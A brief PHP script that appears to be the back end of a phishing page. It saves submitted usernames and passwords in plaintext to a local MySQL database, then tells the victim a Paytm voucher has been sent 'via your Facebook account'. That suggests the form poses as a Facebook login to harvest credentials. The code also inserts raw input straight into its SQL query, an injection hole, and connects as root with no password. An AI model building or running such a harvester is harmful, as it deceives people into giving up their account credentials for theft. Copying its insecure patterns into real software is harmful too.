<?php
$username=$_POST['uname'];
$password=$_POST['upwd'];
$con=mysqli_connect("127.0.0.1","root","");
if(!$con)
{
die("connection not established");
}
mysqli_select_db($con,"student");
$query="INSERT INTO data(username,password) VALUES ('$username','$password')";
if(!mysqli_query($con,$query))
{
die("not inserted");
}
else
{
die("PAYTM VOUCHER OF WORTH 100/- HAS BEEN SENT VIA YOUR FACEBOOK ACCOUNT!ENJOY!!!");
}
?>
